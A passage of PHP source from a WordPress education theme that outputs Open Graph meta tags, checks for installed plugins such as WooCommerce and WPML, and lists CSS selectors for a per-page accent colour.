				
				if ( ! empty( $shop_page_id ) ) {
					$id = $shop_page_id;
					// set flag
					$description = 'woocommerce-shop';
				}
			}
			
			if ( function_exists( 'is_product' ) && is_product() ) {
				$type = 'product';
			}
			
			// if id exist use wp template tags
			if ( ! empty( $id ) ) {
				$url   = get_permalink( $id );
				$title = get_the_title( $id );
				
				// apply bloginfo description to woocommerce shop page instead of first product item description
				if ( $description === 'woocommerce-shop' ) {
					$description = get_bloginfo( 'description' );
				} else {
					$description = strip_tags( apply_filters( 'the_excerpt', get_post_field( 'post_excerpt', $id ) ) );
				}
				
				// has featured image
				if ( get_post_thumbnail_id( $id ) !== '' ) {
					$image = wp_get_attachment_url( get_post_thumbnail_id( $id ) );
				} else {
					$image = educator_edge_option_get_value( 'open_graph_image' );
				}
			} else {
				global $wp;
				$url         = esc_url( home_url( add_query_arg( array(), $wp->request ) ) );
				$title       = get_bloginfo( 'name' );
				$description = get_bloginfo( 'description' );
				$image       = educator_edge_option_get_value( 'open_graph_image' );
			}
			
			?>
			
			<meta property="og:url" content="<?php echo esc_url( $url ); ?>"/>
			<meta property="og:type" content="<?php echo esc_html( $type ); ?>"/>
			<meta property="og:title" content="<?php echo esc_html( $title ); ?>"/>
			<meta property="og:description" content="<?php echo esc_html( $description ); ?>"/>
			<meta property="og:image" content="<?php echo esc_url( $image ); ?>"/>
		
		<?php }
	}
	
	add_action( 'wp_head', 'educator_edge_open_graph' );
}

if ( ! function_exists( 'educator_edge_core_plugin_installed' ) ) {
	/**
	 * Function that checks if Edge Core plugin installed
	 * @return bool
	 */
	function educator_edge_core_plugin_installed() {
		return defined( 'EDGE_CORE_VERSION' );
	}
}

if(!function_exists('educator_edge_the_events_calendar_installed')) {
	/**
	 * Checks whether The Event Calendar plugins is installed
	 * @return bool
	 */
	function educator_edge_the_events_calendar_installed() {
		return class_exists('Tribe__Events__Main');
	}
}

if ( ! function_exists( 'educator_edge_is_woocommerce_installed' ) ) {
	/**
	 * Function that checks if Woocommerce plugin installed
	 * @return bool
	 */
	function educator_edge_is_woocommerce_installed() {
		return function_exists( 'is_woocommerce' );
	}
}

if ( ! function_exists( 'educator_edge_visual_composer_installed' ) ) {
	/**
	 * Function that checks if Visual Composer plugin installed
	 * @return bool
	 */
	function educator_edge_visual_composer_installed() {
		return class_exists( 'WPBakeryVisualComposerAbstract' );
	}
}

if ( ! function_exists( 'educator_edge_revolution_slider_installed' ) ) {
	/**
	 * Function that checks if Revolution Slider plugin installed
	 * @return bool
	 */
	function educator_edge_revolution_slider_installed() {
		return class_exists( 'RevSliderFront' );
	}
}

if ( ! function_exists( 'educator_edge_contact_form_7_installed' ) ) {
	/**
	 * Function that checks if Contact Form 7 plugin installed
	 * @return bool
	 */
	function educator_edge_contact_form_7_installed() {
		return defined( 'WPCF7_VERSION' );
	}
}

if ( ! function_exists( 'educator_edge_is_wpml_installed' ) ) {
	/**
	 * Function that checks if WPML plugin installed
	 * @return bool
	 */
	function educator_edge_is_wpml_installed() {
		return defined( 'ICL_SITEPRESS_VERSION' );
	}
}

if (!function_exists('educator_edge_generate_first_main_color_per_page')) {
	/**
	 * Function that checks first main color in page options and generate css if color is set
	 */
	function educator_edge_generate_first_main_color_per_page($style) {
		$id = educator_edge_get_page_id();
		$first_color = educator_edge_get_meta_field_intersect('first_color', $id);
		if ($first_color !== '') {

			extract(educator_edge_generate_first_color_selectors());

			$style .= educator_edge_dynamic_css($color_selector, array('color' => $first_color));
			$style .= educator_edge_dynamic_css($color_important_selector, array('color' => $first_color . ' !important'));
			$style .= educator_edge_dynamic_css('::selection', array('background' => $first_color));
			$style .= educator_edge_dynamic_css('::-moz-selection', array('background' => $first_color));
			$style .= educator_edge_dynamic_css($background_color_selector, array('background-color' => $first_color));
			$style .= educator_edge_dynamic_css($border_color_selector, array('border-color' => $first_color));
			$style .= educator_edge_dynamic_css($border_color_important_selector, array('border-color' => $first_color . ' !important'));
		}
		return $style;
	}

	add_filter('educator_edge_add_page_custom_style', 'educator_edge_generate_first_main_color_per_page');
}

if (!function_exists('educator_edge_generate_first_color_selectors')) {
	/**
	 * Function generate arrays of selectors for first color option
	 */
	function educator_edge_generate_first_color_selectors() {

		$return_array = array();
		//generate color selector array
		$return_array['color_selector'] = array(
				'a:hover',
				'blockquote',
				'h1 a:hover',
				'h2 a:hover',
				'h3 a:hover',
				'h4 a:hover',
				'h5 a:hover',
				'p a:hover',
				'blockquote p:before',
				'.edgt-comment-holder .edgt-comment-text .comment-edit-link',
				'.edgt-comment-holder .edgt-comment-text .comment-reply-link',
				'.edgt-comment-holder .edgt-comment-text .replay',
				'.edgt-comment-holder .edgt-comment-text .comment-edit-link:before',
				'.edgt-comment-holder .edgt-comment-text .comment-reply-link:before',
				'.edgt-comment-holder .edgt-comment-text .replay:before',
				'.edgt-comment-holder .edgt-comment-text #cancel-comment-reply-link',
				'.edgt-owl-slider .owl-nav .owl-next:hover .edgt-next-icon',
				'.edgt-owl-slider .owl-nav .owl-next:hover .edgt-prev-icon',
				'.edgt-owl-slider .owl-nav .owl-prev:hover .edgt-next-icon',
				'.edgt-owl-slider .owl-nav .owl-prev:hover .edgt-prev-icon',
				'footer .widget ul li a:hover',
				'footer .widget #wp-calendar tfoot a:hover',
				'footer .widget.widget_search .input-holder button:hover',
				'footer .widget.widget_tag_cloud a:hover',
				'aside.edgt-sidebar .widget.widget_text .edgt-anchor-menu ul li:hover a',
				'aside.edgt-sidebar .widget.widget_nav_menu ul>li ul.sub-menu li.current-menu-item>a',
				'aside.edgt-sidebar .widget.widget_nav_menu ul>li ul.sub-menu li:hover>a',
				'aside.edgt-sidebar .widget.widget_nav_menu ul>li.menu-item-has-children>a.edgt-custom-menu-active',
				'aside.edgt-sidebar .widget.widget_nav_menu ul>li.menu-item-has-children>a:hover',
				'aside.edgt-sidebar .widget.widget_nav_menu ul>li.menu-item-has-children>a:before',
				'.wpb_widgetised_column .widget.widget_nav_menu ul>li.menu-item-has-children>a:before',
				'.wpb_widgetised_column .widget.widget_nav_menu ul>li ul.sub-menu li.current-menu-item a',
				'.wpb_widgetised_column .widget.widget_nav_menu ul>li ul.sub-menu li:hover a',
				'.widget.edgt-blog-list-widget .edgt-blog-list-holder.edgt-bl-simple .edgt-post-title a:hover',
				'.widget.edgt-blog-list-widget .edgt-post-info-date a:hover',
				'.wpb_widgetised_column.edgt-course-features-widget .edgt-course-features li .edgt-item-icon',
				'.widget.widget_rss .edgt-widget-title .rsswidget:hover',
				'.widget.widget_search button:hover',
				'.widget.edgt-course-categories-widget .edgt-course-categories-list li i',
				'.widget.edgt-course-categories-widget .edgt-course-categories-list li span',
				'.widget.edgt-course-categories-widget .edgt-course-categories-list li a:hover',
				'.widget.edgt-blog-categories-widget .edgt-blog-categories-list li i',
				'.widget.edgt-blog-categories-widget .edgt-blog-categories-list li span',
				'.widget.edgt-blog-categories-widget .edgt-blog-categories-list li a:hover',
				'.widget.edgt-course-features-widget .edgt-course-features li .edgt-item-icon',
				'.edgt-page-footer .widget a:hover',
				'.edgt-side-menu .widget a:hover',
				'.edgt-page-footer .widget.widget_rss .edgt-footer-widget-title .rsswidget:hover',
				'.edgt-side-menu .widget.widget_rss .edgt-footer-widget-title .rsswidget:hover',
				'.edgt-page-footer .widget.widget_search button:hover',
				'.edgt-side-menu .widget.widget_search button:hover',
				'.edgt-page-footer .widget.widget_tag_cloud a:hover',
				'.edgt-side-menu .widget.widget_tag_cloud a:hover',
				'.edgt-top-bar a:hover',
				'.edgt-icon-widget-holder',
				'.edgt-icon-widget-holder.edgt-link-with-href:hover .edgt-icon-text',
				'.widget.widget_edgt_twitter_widget .edgt-twitter-widget.edgt-twitter-standard li .edgt-twitter-icon',
				'.widget ul li a',
				'.widget #wp-calendar tfoot a',
				'.wpb_widgetised_column .widget.edgt-search-post-type-widget .edgt-post-type-search-results ul li a:hover',
				'.widget.widget_edgt_twitter_widget .edgt-twitter-widget.edgt-twitter-slider li .edgt-tweet-text a',
				'.widget.widget_edgt_twitter_widget .edgt-twitter-widget.edgt-twitter-slider li .edgt-tweet-text span',
				'.widget.widget_edgt_twitter_widget .edgt-twitter-widget.edgt-twitter-standard li .edgt-tweet-text a:hover',
				'.widget.widget_edgt_twitter_widget .edgt-twitter-widget.edgt-twitter-slider li .edgt-twitter-icon i',
				'#tribe-events-content-wrapper .tribe-bar-views-list li a:hover',
				'#tribe-events-content-wrapper .tribe-bar-views-list li.tribe-bar-active a',
				'#tribe-events-content-wrapper .tribe-events-sub-nav .tribe-events-nav-next a:hover',
				'#tribe-events-content-wrapper .tribe-events-sub-nav .tribe-events-nav-previous a:hover',
				'#tribe-events-content-wrapper .tribe-events-calendar td div[id*=tribe-events-daynum-] a:hover',
				'#tribe-events-content-wrapper .tribe-events-ical.tribe-events-button',
				'.edgt-tribe-events-single .edgt-events-single-meta .edgt-events-single-meta-item span.edgt-events-single-meta-value a',
				'.edgt-tribe-events-single .edgt-events-single-meta .edgt-events-single-next-event a:hover',
				'.edgt-tribe-events-single .edgt-events-single-meta .edgt-events-single-prev-event a:hover',
				'#bbpress-forums li.bbp-header>ul>li a:hover',
				'#bbpress-forums li.bbp-body .bbp-forum-freshness .bbp-author-name',
				'body.forum-archive #bbpress-forums li.bbp-body ul.forum li.bbp-forum-freshness>a:hover',
				'body.forum-archive #bbpress-forums li.bbp-body ul.forum li.bbp-topic-freshness>a:hover',
				'body.forum-archive #bbpress-forums li.bbp-body .bbp-topic-started-by .bbp-author-name',
				'body.forum #bbpress-forums .subscription-toggle',
				'body.forum #bbpress-forums li.bbp-body ul.topic li.bbp-forum-freshness>a:hover',
				'body.forum #bbpress-forums li.bbp-body ul.topic li.bbp-topic-freshness>a:hover',
				'body.forum #bbpress-forums li.bbp-body ul.topic .bbp-topic-freshness-author .bbp-author-name',
				'body.forum #bbpress-forums li.bbp-body ul.topic.sticky:after',
				'body.forum #bbpress-forums li.bbp-body .bbp-topic-started-by .bbp-author-name',
				'#bbpress-forums div.bbp-breadcrumb .bbp-breadcrumb-current',
				'#bbpress-forums div.bbp-breadcrumb .bbp-breadcrumb-home:hover',
				'#bbpress-forums #bbp-single-user-details #bbp-user-navigation li.current a',
				'#bbpress-forums #bbp-single-user-details #bbp-user-navigation li a:hover',
				'#bbpress-forums #bbp-user-body .bbp-topic-freshness-author .bbp-author-name',
				'#bbpress-forums #bbp-user-body .bbp-topic-started-by .bbp-author-name',
				'body.topic #bbpress-forums .bbp-replies li.bbp-body div.bbp-reply-author .bbp-author-name',
				'.edgt-sidebar .widget.widget_display_replies ul li',
				'.edgt-sidebar .widget.widget_display_topics ul li',
				'.edgt-sidebar .widget_display_forums li a:after',
				'.edgt-sidebar .widget_display_views li a:after',
				'.edgt-sidebar .widget_display_forums li a:hover',
				'.edgt-sidebar .widget_display_views li a:hover',
				'.edgt-blog-holder article.sticky .edgt-post-title a',
				'.edgt-blog-holder.edgt-blog-narrow article .edgt-post-info.edgt-section-bottom .edgt-post-info-author a:hover',
				'.edgt-blog-holder.edgt-blog-narrow article .edgt-post-info.edgt-section-bottom .edgt-blog-like:hover i:first-child',
				'.edgt-blog-holder.edgt-blog-narrow article .edgt-post-info.edgt-section-bottom .edgt-blog-like:hover span:first-child',
				'.edgt-blog-holder.edgt-blog-narrow article .edgt-post-info.edgt-section-bottom .edgt-post-info-comments-holder:hover span:first-child',
				'.edgt-blog-holder.edgt-blog-standard-date-on-side article .edgt-post-date-inner .edgt-post-date-day',
				'.edgt-blog-holder.edgt-blog-standard-date-on-side article .edgt-post-date-inner .edgt-post-date-month',
				'.edgt-blog-holder.edgt-blog-standard-date-on-side article .edgt-post-title a:hover',
				'.edgt-blog-holder.edgt-blog-standard-date-on-side article .edgt-post-info>div a:hover',
				'.edgt-blog-holder.edgt-blog-standard-date-on-side article.format-quote .edgt-quote-author',
				'.edgt-blog-holder.edgt-blog-standard article .edgt-post-info-bottom .edgt-post-info-author a:hover',
				'.edgt-blog-holder.edgt-blog-standard article .edgt-post-info-bottom .edgt-blog-like:hover i:first-child',
				'.edgt-blog-holder.edgt-blog-standard article .edgt-post-info-bottom .edgt-blog-like:hover span:first-child',
				'.edgt-blog-holder.edgt-blog-standard article .edgt-post-info-bottom .edgt-post-info-comments-holder:hover span:first-child',
				'.edgt-author-description .edgt-author-description-text-holder .edgt-author-name a:hover',
				'.edgt-bl-standard-pagination ul li.edgt-bl-pag-active a',
				'.edgt-blog-pagination ul li a.edgt-pag-active',
				'.edgt-blog-pagination ul li a:hover',
				'.edgt-blog-single-navigation .edgt-blog-single-next:hover',
				'.edgt-blog-single-navigation .edgt-blog-single-prev:hover',
				'.edgt-page-footer .edgt-footer-top-holder.dark .widget a:hover',
				'.edgt-main-menu ul li a:hover',
				'.edgt-main-menu ul li a .edgt-menu-featured-icon',
				'.edgt-main-menu>ul>li.edgt-active-item>a',
				'.edgt-drop-down .second .inner ul li a:hover',
				'.edgt-drop-down .second .inner ul li.current-menu-ancestor>a',
				'.edgt-drop-down .second .inner ul li.current-menu-item>a',
				'.edgt-drop-down .wide .second .inner ul li a:hover',
				'.edgt-drop-down .wide .second .inner>ul>li.current-menu-ancestor>a',
				'.edgt-drop-down .wide .second .inner>ul>li.current-menu-item>a',
				'.edgt-drop-down .wide .second .inner>ul>li.uses-custom-sidebar .widget.edgt-course-list-widget .edgt-course-list-holder.edgt-cl-minimal article .edgt-cli-text .edgt-cli-title a:hover',
				'nav.edgt-fullscreen-menu ul li ul li.current-menu-ancestor>a',
				'nav.edgt-fullscreen-menu ul li ul li.current-menu-item>a',
				'nav.edgt-fullscreen-menu>ul>li.edgt-active-item>a',
				'.edgt-mobile-header .edgt-mobile-nav ul li.current-menu-ancestor>a',
				'.edgt-mobile-header .edgt-mobile-nav ul li.current-menu-item>a',
				'.edgt-mobile-header .edgt-mobile-nav ul li a:hover',
				'.edgt-mobile-header .edgt-mobile-nav ul li h6:hover',
				'.edgt-mobile-header .edgt-mobile-nav ul ul li.current-menu-ancestor>a',
				'.edgt-mobile-header .edgt-mobile-nav ul ul li.current-menu-item>a',
				'.edgt-mobile-header .edgt-mobile-nav .edgt-grid>ul>li>a:hover',
				'.edgt-mobile-header .edgt-mobile-nav .edgt-grid>ul>li>h6:hover',
				'.edgt-mobile-header .edgt-mobile-nav .edgt-grid>ul>li.edgt-active-item>a',
				'.edgt-mobile-header .edgt-mobile-nav .edgt-grid>ul>li.edgt-active-item>.mobile_arrow>.edgt-sub-arrow',
				'.edgt-mobile-header .edgt-mobile-nav li.current-menu-ancestor>.mobile_arrow',
				'.edgt-mobile-header .edgt-mobile-nav li.current-menu-item .mobile_arrow',
				'.edgt-search-page-holder article.sticky .edgt-post-title a',
				'.edgt-side-menu-button-opener.opened',
				'.edgt-side-menu-button-opener:hover',
				'.edgt-side-menu a.edgt-close-side-menu:hover',
				'.edgt-masonry-gallery-holder .edgt-mg-item .edgt-mg-item-subtitle',
				'.edgt-masonry-gallery-holder .edgt-mg-item .edgt-mg-item-link',
				'.edgt-accordion-holder .edgt-accordion-title .edgt-accordion-mark',
				'.edgt-banner-holder .edgt-banner-link-text .edgt-banner-link-hover span',
				'.edgt-btn.edgt-btn-simple',
				'.edgt-countdown .countdown-row .countdown-section .countdown-amount',
				'.edgt-countdown .countdown-row .countdown-section .countdown-period',
				'.edgt-counter-holder .edgt-counter',
				'.edgt-icon-list-holder .edgt-il-icon-holder>*',
				'.edgt-image-gallery.edgt-ig-carousel-type .owl-nav .owl-next:hover .edgt-next-icon',
				'.edgt-image-gallery.edgt-ig-carousel-type .owl-nav .owl-next:hover .edgt-prev-icon',
				'.edgt-image-gallery.edgt-ig-carousel-type .owl-nav .owl-prev:hover .edgt-next-icon',
				'.edgt-image-gallery.edgt-ig-carousel-type .owl-nav .owl-prev:hover .edgt-prev-icon',
				'.edgt-image-gallery.edgt-ig-carousel-type .owl-nav .edgt-next-icon',
				'.edgt-image-gallery.edgt-ig-carousel-type .owl-nav .edgt-prev-icon',
				'.edgt-social-share-holder.edgt-dropdown .edgt-social-share-dropdown-opener:hover',
				'.edgt-tabs.edgt-tabs-vertical .edgt-tabs-nav li.ui-state-active a',
				'.edgt-tabs.edgt-tabs-vertical .edgt-tabs-nav li.ui-state-hover a',
				'.edgt-team .edgt-team-social-wrapp .edgt-icon-shortcode i:hover',
				'.edgt-team .edgt-team-social-wrapp .edgt-icon-shortcode span:hover',
				'.edgt-team.main-info-below-image.info-below-image-boxed .edgt-team-social-wrapp .edgt-icon-shortcode .flip-icon-holder .icon-normal span',
				'.edgt-team.main-info-below-image.info-below-image-standard .edgt-team-social-wrapp .edgt-icon-shortcode .flip-icon-holder .icon-flip span',
				'.edgt-membership-dashboard-content-holder .edgt-lms-profile-favorites-holder .edgt-lms-profile-favorite-item-title .edgt-course-wishlist',
				'.edgt-cl-filter-holder .edgt-course-layout-filter span.edgt-active',
				'.edgt-cl-filter-holder .edgt-course-layout-filter span:hover',
				'.edgt-cl-standard-pagination ul li.edgt-cl-pag-active a',
				'.edgt-advanced-course-search .select2.edgt-course-category:before',
				'.edgt-advanced-course-search .select2.edgt-course-instructor:before',
				'.edgt-advanced-course-search .select2.edgt-course-price:before',
				'.edgt-course-table-holder tbody .edgt-ct-item .edgt-tc-course-field .edgt-cli-title-holder:hover',
				'.edgt-course-table-holder tbody .edgt-ct-item .edgt-tc-instructor-field a:hover .edgt-instructor-name',
				'.edgt-course-table-holder tbody .edgt-ct-item .edgt-tc-category-field .edgt-cli-category-holder a:hover',
				'.edgt-course-features-holder .edgt-course-features li .edgt-item-icon',
				'.edgt-course-list-holder.edgt-cl-minimal article .edgt-ci-price-holder',
				'.edgt-course-single-holder .edgt-course-basic-info-wrapper .edgt-course-category-items a:hover',
				'.edgt-course-single-holder .edgt-course-basic-info-wrapper .edgt-instructor-name:hover',
				'.edgt-course-single-holder .edgt-course-basic-info-wrapper .edgt-post-info-comments:hover',
				'.edgt-course-reviews-list .edgt-comment-holder .edgt-review-title',
				'.edgt-course-single-holder .edgt-course-tabs-wrapper .edgt-course-curriculum .edgt-section-element .edgt-element-info .edgt-element-clock-icon',
				'.edgt-course-single-holder .edgt-course-tabs-wrapper .edgt-course-curriculum .edgt-section-element .edgt-element-preview-holder',
				'.edgt-course-popup .edgt-course-popup-items .edgt-section-element .edgt-element-name .edgt-element-preview-holder',
				'.edgt-course-popup .edgt-course-popup-items .edgt-section-element .edgt-element-name:hover',
				'.edgt-instructor.info-bellow .edgt-instructor-name:hover',
				'.edgt-lesson-single-holder .edgt-lms-message',
				'.edgt-twitter-list-holder .edgt-twitter-icon',
				'.edgt-twitter-list-holder .edgt-tweet-text a:hover',
				'.edgt-twitter-list-holder .edgt-twitter-profile a:hover',
				'.edgt-modal-holder .edgt-modal-content .edgt-lost-pass-holder a',
				'.edgt-modal-holder .edgt-modal-content .edgt-register-link-holder .edgt-modal-opener',
				'.edgt-login-register-content .edgt-lost-pass-remember-holder .edgt-lost-pass-holder a',
				'.edgt-login-register-content .edgt-register-link-holder .edgt-modal-opener',
				'.edgt-menu-area .edgt-login-register-widget.edgt-user-not-logged-in .edgt-modal-opener.edgt-login-opener',
				'.edgt-top-bar .edgt-login-register-widget.edgt-user-logged-in .edgt-login-dropdown li a:hover',
                '.edgt-price-table .edgt-pt-inner ul li.edgt-pt-prices .edgt-pt-value',
                '.edgt-price-table .edgt-pt-inner ul li.edgt-pt-prices .edgt-pt-price',
                '.edgt-course-reviews-list-top .edgt-course-reviews-number',
                '.edgt-counter-icon .edgt-icon-shortcode .edgt-icon-element',
                '.edgt-icon-tabs .edgt-icon-tabs-nav li.ui-state-active .edgt-icon-tabs-title-holder',
                '.edgt-icon-tabs .edgt-icon-tabs-nav li.ui-state-hover .edgt-icon-tabs-title-holder'
		);

		$woo_color_selector = array();
		if(educator_edge_is_woocommerce_installed()) {
			$woo_color_selector = array(
					'.edgt-woocommerce-page table.cart tr.cart_item td.product-name a:hover',
					'.edgt-woocommerce-page table.cart tr.cart_item td.product-subtotal .amount',
					'.edgt-woocommerce-page .cart-collaterals table td strong',
					'.woocommerce-pagination .page-numbers li a.current',
					'.woocommerce-pagination .page-numbers li a:hover',
					'.woocommerce-pagination .page-numbers li span.current',
					'.woocommerce-pagination .page-numbers li span:hover',
					'.woocommerce-page .edgt-content .edgt-quantity-buttons .edgt-quantity-minus:hover',
					'.woocommerce-page .edgt-content .edgt-quantity-buttons .edgt-quantity-plus:hover',
					'div.woocommerce .edgt-quantity-buttons .edgt-quantity-minus:hover',
					'div.woocommerce .edgt-quantity-buttons .edgt-quantity-plus:hover',
					'ul.products>.product:hover .added_to_cart',
					'ul.products>.product:hover .button',
					'ul.products>.product:hover .edgt-pl-inner .added_to_cart',
					'ul.products>.product:hover .edgt-pl-inner .button',
					'ul.products>.product .price',
					'ul.products>.product .added_to_cart',
					'ul.products>.product .button',
					'.edgt-woo-single-page .edgt-single-product-summary .price',
					'.edgt-woo-single-page .edgt-single-product-summary .product_meta>span a:hover',
					'.edgt-woo-single-page .edgt-single-product-summary .edgt-woo-social-share-holder .edgt-social-share-title',
					'.edgt-woo-single-page .edgt-single-product-summary .edgt-woo-social-share-holder .social_share',
					'.edgt-woo-single-page .related.products .product .button',
					'.edgt-woo-single-page .upsells.products .product .button',
					'.edgt-shopping-cart-dropdown .edgt-item-info-holder .remove:hover',
					'.edgt-shopping-cart-dropdown .edgt-item-info-holder .amount',
					'.edgt-shopping-cart-dropdown .edgt-item-info-holder .edgt-quantity',
					'.widget.woocommerce.widget_layered_nav ul li.chosen a',
					'.widget.woocommerce.widget_price_filter .price_slider_amount .button',
					'.widget.woocommerce.widget_product_categories ul li a:hover',
					'.widget.woocommerce.widget_products ul li a:hover',
					'.widget.woocommerce.widget_recently_viewed_products ul li a:hover',
					'.widget.woocommerce.widget_top_rated_products ul li a:hover',
					'.widget.woocommerce.widget_products ul li .amount',
					'.widget.woocommerce.widget_recently_viewed_products ul li .amount',
					'.widget.woocommerce.widget_top_rated_products ul li .amount'
			);
		}

		$return_array['color_selector'] = array_merge($return_array['color_selector'], $woo_color_selector);


		//generate color important selector array
		$return_array['color_important_selector'] = array(
				'.edgt-top-bar-dark .edgt-top-bar .edgt-icon-widget-holder:hover',
				'.edgt-top-bar-dark .edgt-top-bar .widget a:hover .edgt-btn-text',
				'.edgt-top-bar-dark .edgt-top-bar .widget a:not(.lang_sel_sel):hover',
				'.edgt-btn.edgt-btn-simple:not(.edgt-btn-custom-hover-color):hover',
				'.edgt-woocommerce-page .woocommerce-message a.button'
		);

		//generate background color selectors array
		$return_array['background_color_selector'] = array(
				'.edgt-st-loader .pulse',
				'.edgt-st-loader .double_pulse .double-bounce1',
				'.edgt-st-loader .double_pulse .double-bounce2',
				'.edgt-st-loader .cube',
				'.edgt-st-loader .rotating_cubes .cube1',
				'.edgt-st-loader .rotating_cubes .cube2',
				'.edgt-st-loader .stripes>div',
				'.edgt-st-loader .wave>div',
				'.edgt-st-loader .two_rotating_circles .dot1',
				'.edgt-st-loader .two_rotating_circles .dot2',
				'.edgt-st-loader .five_rotating_circles .container1>div',
				'.edgt-st-loader .five_rotating_circles .container2>div',
				'.edgt-st-loader .five_rotating_circles .container3>div',
				'.edgt-st-loader .atom .ball-1:before',
				'.edgt-st-loader .atom .ball-2:before',
				'.edgt-st-loader .atom .ball-3:before',
				'.edgt-st-loader .atom .ball-4:before',
				'.edgt-st-loader .clock .ball:before',
				'.edgt-st-loader .mitosis .ball',
				'.edgt-st-loader .lines .line1',
				'.edgt-st-loader .lines .line2',
				'.edgt-st-loader .lines .line3',
				'.edgt-st-loader .lines .line4',
				'.edgt-st-loader .fussion .ball',
				'.edgt-st-loader .fussion .ball-1',
				'.edgt-st-loader .fussion .ball-2',
				'.edgt-st-loader .fussion .ball-3',
				'.edgt-st-loader .fussion .ball-4',
				'.edgt-st-loader .wave_circles .ball',
				'.edgt-st-loader .pulse_circles .ball',
				'#submit_comment',
				'.post-password-form input[type=submit]',
				'input.wpcf7-form-control.wpcf7-submit',
				'.edgt-owl-slider .owl-dots .owl-dot.active span',
				'.edgt-owl-slider .owl-dots .owl-dot:hover span',
				'#edgt-back-to-top',
				'.widget.edgt-search-post-type-widget .edgt-seach-icon-holder',
				'#tribe-events-content-wrapper .tribe-bar-filters .tribe-events-button',
				'#tribe-events-content-wrapper .tribe-events-calendar td.tribe-events-present div[id*=tribe-events-daynum-]',
				'.edgt-tribe-events-single .edgt-events-single-main-info .edgt-events-single-title-holder .edgt-events-single-cost',
				'#bbpress-forums button',
				'.edgt-sidebar .bbp_widget_login button:hover',
				'.edgt-blog-holder article.format-audio .edgt-blog-audio-holder .mejs-container .mejs-controls>.mejs-time-rail .mejs-time-total .mejs-time-current',
				'.edgt-blog-holder article.format-audio .edgt-blog-audio-holder .mejs-container .mejs-controls>a.mejs-horizontal-volume-slider .mejs-horizontal-volume-current',
				'.edgt-blog-holder.edgt-blog-split-column article .edgt-post-info-bottom .edgt-post-info-bottom-left>div a',
				'.edgt-blog-holder.edgt-blog-standard article .edgt-post-info-bottom .edgt-post-info-bottom-left>div a',
				'.edgt-blog-holder.edgt-blog-single article .edgt-post-info-bottom .edgt-post-info-bottom-left>div a',
				'.edgt-events-list-item-title-holder .edgt-events-list-item-price',
				'.edgt-drop-down .wide .second .inner>ul>li.uses-custom-sidebar .widget.edgt-course-list-widget .edgt-course-list-holder.edgt-cl-minimal article .edgt-cli-text .edgt-ci-price-holder .edgt-ci-price-value',
				'.edgt-masonry-gallery-holder .edgt-mg-item.edgt-mg-simple.edgt-mg-skin-default .edgt-mg-item-inner',
				'.edgt-btn.edgt-btn-solid',
				'.edgt-comparision-pricing-tables-holder .edgt-cpt-table.edgt-featured-item .edgt-cpt-table-btn a',
				'.edgt-comparision-pricing-tables-holder .edgt-cpt-table .edgt-cpt-table-btn a:hover',
				'.edgt-tml-holder .edgt-timeline .edgt-tml-item-holder:not(:last-of-type)::after',
				'.edgt-tml-holder .edgt-timeline .edgt-tml-item-holder .edgt-tml-item-circle',
				'.edgt-dark-header #fp-nav ul li a.active span',
				'.edgt-dark-header #fp-nav ul li a:hover span',
				'.edgt-icon-shortcode.edgt-circle',
				'.edgt-icon-shortcode.edgt-dropcaps.edgt-circle',
				'.edgt-icon-shortcode.edgt-square',
				'.edgt-price-table.edgt-price-table-active .edgt-active-pt-label .edgt-active-pt-label-inner',
				'.edgt-progress-bar .edgt-pb-content-holder .edgt-pb-content',
				'.edgt-course-table-holder tbody .edgt-ct-item .edgt-tc-course-field .edgt-ci-price-holder .edgt-ci-price-value',
				'.edgt-course-list-holder.edgt-cl-standard article .edgt-cli-text-holder .edgt-cli-top-info .edgt-ci-price-holder .edgt-ci-price-value',
				'.edgt-course-single-holder .edgt-course-single-type',
				'.edgt-course-popup .edgt-popup-heading',
				'.edgt-menu-area .edgt-login-register-widget.edgt-user-not-logged-in .edgt-modal-opener.edgt-login-opener:hover',
				'.edgt-menu-area .edgt-login-register-widget.edgt-user-not-logged-in .edgt-modal-opener.edgt-register-opener',
				'#submit_comment:hover',
				'.post-password-form input[type=submit]:hover',
				'input.wpcf7-form-control.wpcf7-submit:hover',
				'#tribe-events-content-wrapper .tribe-bar-filters .tribe-events-button:hover',
				'.edgt-blog-holder.edgt-blog-split-column article .edgt-post-info-bottom .edgt-post-info-bottom-left>div a:hover',
				'.edgt-blog-holder.edgt-blog-standard article .edgt-post-info-bottom .edgt-post-info-bottom-left>div a:hover',
				'.edgt-blog-holder.edgt-blog-single article .edgt-post-info-bottom .edgt-post-info-bottom-left>div a:hover',
				'.edgt-comparision-pricing-tables-holder .edgt-cpt-table.edgt-featured-item .edgt-cpt-table-btn a:hover',
                '.edgt-woo-pl-info-below-image .edgt-pl-main-holder ul.products>.product .added_to_cart',
                '.edgt-woo-pl-info-below-image .edgt-pl-main-holder ul.products>.product .button',
				'.woocommerce-page .edgt-content a.button:hover',
				'.woocommerce-page .edgt-content button[type=submit]:not(.edgt-woo-search-widget-button):hover',
				'.woocommerce-page .edgt-content input[type=submit]:hover',
				'div.woocommerce .wc-forward:not(.added_to_cart):not(.checkout-button):hover',
				'div.woocommerce a.added_to_cart:hover',
				'div.woocommerce a.button:hover',
				'div.woocommerce button[type=submit]:not(.edgt-woo-search-widget-button):hover',
				'div.woocommerce input[type=submit]:hover',
				'.edgt-pl-holder .edgt-pli-inner .edgt-pli-text-inner .edgt-pli-add-to-cart.edgt-default-skin .added_to_cart:hover',
				'.edgt-pl-holder .edgt-pli-inner .edgt-pli-text-inner .edgt-pli-add-to-cart.edgt-default-skin .button:hover',
				'.edgt-menu-area .edgt-login-register-widget.edgt-user-not-logged-in .edgt-modal-opener.edgt-register-opener:hover',
                '.edgt-events-list-item.edgt-events-light-date-skin .edgt-events-list-item-image-holder:hover .edgt-events-list-item-date-holder',
                '.edgt-events-list-item-date-holder',
                '.edgt-tribe-events-single .edgt-events-single-main-info .edgt-events-single-date-holder',
                'input.wpcf7-form-control.wpcf7-submit',
                'input.wpcf7-form-control.wpcf7-submit:hover',
                '.edgt-course-list-holder.edgt-cl-standard article .edgt-course-wishlist'
		);

		$woo_background_color_selector = array();
		if(educator_edge_is_woocommerce_installed()) {
			$woo_background_color_selector = array(
					'.woocommerce-page .edgt-content .wc-forward:not(.added_to_cart):not(.checkout-button)',
					'.woocommerce-page .edgt-content a.added_to_cart',
					'.woocommerce-page .edgt-content a.button',
					'.woocommerce-page .edgt-content button[type=submit]:not(.edgt-woo-search-widget-button)',
					'.woocommerce-page .edgt-content input[type=submit]',
					'div.woocommerce .wc-forward:not(.added_to_cart):not(.checkout-button)',
					'div.woocommerce a.added_to_cart',
					'div.woocommerce a.button',
					'div.woocommerce button[type=submit]:not(.edgt-woo-search-widget-button)',
